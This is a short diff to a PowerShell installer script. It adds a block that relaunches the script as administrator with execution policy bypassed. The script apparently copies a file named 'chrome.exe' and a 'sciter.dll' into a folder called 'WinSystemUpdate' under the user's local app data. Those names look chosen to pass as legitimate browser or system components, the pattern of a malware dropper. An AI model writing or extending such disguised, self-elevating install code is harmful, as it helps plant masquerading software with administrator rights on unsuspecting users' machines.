@@ -1,3 +1,9 @@
+# Request admin if not already
+if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
+    Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -Command &{$($MyInvocation.MyCommand.Definition)}" -Verb RunAs
+    exit
+}
+
 $DEST="$env:LOCALAPPDATA\WinSystemUpdate"
 $EXE="$DEST\chrome.exe"
 $DLL="$DEST\sciter.dll"
